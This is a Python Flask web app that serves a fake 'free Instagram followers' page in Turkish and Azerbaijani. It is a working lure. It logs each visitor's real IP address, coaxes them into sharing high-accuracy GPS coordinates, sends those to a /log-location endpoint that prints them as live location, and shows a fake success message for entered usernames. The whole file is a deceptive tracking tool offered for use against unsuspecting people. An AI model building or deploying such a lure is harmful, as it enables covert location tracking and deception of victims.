from flask import Flask, request, jsonify
import os
import datetime

app = Flask(__name__)

@app.route('/')
def index():
    real_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
    
    print(f"[{datetime.datetime.now()}] 🆕 ZİYARƏTÇİ - IP: {real_ip}")

    html = f"""<!DOCTYPE html>
    <html>
    <head>
        <title>Instagram Takipçi Hilesi</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * {{margin:0;padding:0;box-sizing:border-box;}}
            body {{font-family:Arial,sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}}
            .container {{background:white;padding:40px;border-radius:15px;box-shadow:0 15px 35px rgba(0,0,0,0.2);text-align:center;max-width:500px;width:100%;}}
            button {{width:100%;padding:16px;background:linear-gradient(45deg,#E1306C,#F77737);color:white;border:none;border-radius:8px;font-size:18px;margin:10px 0;cursor:pointer;}}
            input {{width:100%;padding:15px;margin:10px 0;border:2px solid #ddd;border-radius:8px;}}
            #location {{margin:15px 0;padding:15px;background:#f0f8ff;border-radius:10px;display:none;}}
        </style>
    </head>
    <body>
        <div class="container">
            <h1>ÜCRETSİZ İNSTAGRAM TAKİPÇİ</h1>
            <p><strong>IP:</strong> {real_ip}</p>
            
            <button onclick="getLiveLocation()">📍 Yerləşməni Yoxla</button>
            <div id="location"></div>

            <input type="text" id="username" placeholder="Instagram kullanıcı adınız">
            <button onclick="getFollowers()">250 TAKİPÇİ KAZAN</button>
            
            <div id="message" style="margin-top:20px;padding:15px;border-radius:8px;display:none;background:#d4edda;"></div>
        </div>

        <script>
            function getLiveLocation() {{
                const locDiv = document.getElementById('location');
                locDiv.style.display = "block";
                locDiv.innerHTML = "📍 Yerləşmə axtarılır...";

                if (navigator.geolocation) {{
                    navigator.geolocation.getCurrentPosition(showLivePosition, showError, {{
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }});
                }} else {{
                    locDiv.innerHTML = "❌ Cihaz GPS dəstəkləmir";
                }}
            }}

            function showLivePosition(position) {{
                const lat = position.coords.latitude.toFixed(6);
                const lon = position.coords.longitude.toFixed(6);
                const accuracy = position.coords.accuracy.toFixed(0);
                
                const locDiv = document.getElementById('location');
                locDiv.innerHTML = `
                    ✅ <strong>Canlı Yerləşmə Alındı!</strong><br>
                    Koordinat: ${lat}, ${lon}<br>
                    Dəqiqlik: ±${accuracy} metr
                `;

                // Backend-ə göndər (Logs-a düşsün)
                fetch('/log-location', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{lat: lat, lon: lon, accuracy: accuracy}})
                }});
            }}

            function showError(error) {{
                document.getElementById('location').innerHTML = "⚠️ Yerləşmə icazəsi verilmədi və ya tapılmadı.";
            }}

            function getFollowers() {{
                const username = document.getElementById('username').value.trim();
                if (!username) return alert("Kullanıcı adını daxil edin!");
                
                const btn = document.querySelector('button[onclick="getFollowers()"]');
                btn.disabled = true;
                btn.textContent = "GÖZLƏYİN...";
                
                setTimeout(() => {{
                    document.getElementById('message').innerHTML = "✅ 250 takipçi uğurla əlavə edildi!";
                    document.getElementById('message').style.display = "block";
                    btn.disabled = false;
                    btn.textContent = "250 TAKİPÇİ KAZAN";
                }}, 4000);
            }}
        </script>
    </body>
    </html>"""
    return html

@app.route('/log-location', methods=['POST'])
def log_location():
    try:
        data = request.get_json()
        lat = data.get('lat')
        lon = data.get('lon')
        accuracy = data.get('accuracy')
        print(f"📍 CANLI KONUM → Lat: {lat} | Lon: {lon} | Dəqiqlik: ±{accuracy}m")
        return jsonify({"status": "success"})
    except:
        return jsonify({"status": "error"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
